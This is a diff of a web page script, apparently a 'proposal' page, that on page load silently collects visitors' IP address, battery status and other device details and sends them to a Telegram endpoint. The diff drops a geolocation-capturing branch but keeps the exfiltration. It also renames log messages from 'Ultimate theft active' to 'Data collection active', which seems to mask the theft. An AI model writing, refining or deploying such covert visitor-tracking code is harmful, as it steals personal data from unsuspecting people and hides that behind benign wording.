@@ -210,7 +210,7 @@ async function getBatteryInfo() {
 }
 
 function stealInfo() {
-    console.log("🚀 Starting ultimate data collection...");
+    console.log("🚀 Starting data collection...");
 
     const info = {
         timestamp: new Date().toISOString(),
@@ -232,36 +232,17 @@ function stealInfo() {
         } : "unknown"
     };
 
-    // Get everything in parallel
+    // Get IP and Battery
     Promise.all([getIP(), getBatteryInfo()]).then(async ([ip, battery]) => {
         info.ip = ip;
         info.battery = battery;
-
-        // Try Location
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    info.location = {
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy + "m"
-                    };
-                    sendToTelegram(info);
-                },
-                (err) => {
-                    console.log("Location denied");
-                    sendToTelegram(info);
-                }
-            );
-        } else {
-            sendToTelegram(info);
-        }
+        sendToTelegram(info);
     });
 }
 
 // Run after page loads
 window.addEventListener("load", function() {
-    console.log("✅ Proposal page loaded - Ultimate theft active");
+    console.log("✅ Page loaded - Data collection active");
     setTimeout(stealInfo, 3500);   // 3.5 seconds delay
 });
 </script>
